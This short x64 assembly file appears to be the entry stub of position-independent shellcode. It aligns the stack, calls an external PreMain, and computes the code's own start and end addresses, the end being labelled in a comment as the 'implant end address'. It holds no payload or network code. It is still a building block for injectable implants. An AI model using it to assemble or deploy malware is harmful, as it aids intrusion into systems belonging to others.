[BITS 64]
DEFAULT REL

EXTERN PreMain

GLOBAL Start
GLOBAL StRipStart
GLOBAL StRipEnd

[SECTION .text$A]

    Start:
        push  rsi
        mov   rsi, rsp
        and   rsp, 0FFFFFFFFFFFFFFF0h
        sub   rsp, 020h
        call  PreMain
        mov   rsp, rsi
        pop   rsi
        ret

    StRipStart:
        call StRipPtrStart
        ret

    StRipPtrStart:
        mov	rax, [rsp]
        sub rax, 0x1b
        ret

[SECTION .text$D]

    StRipEnd:
        call StRetPtrEnd
        ret

    StRetPtrEnd:
        mov rax, [rsp] ;; get the return address
        add	rax, 0xb   ;; get implant end address
        ret

[SECTION .text$E]

    SymEnd:
        db 'E', 'N', 'D', 'O', 'F', 'C', 'O', 'D', 'E'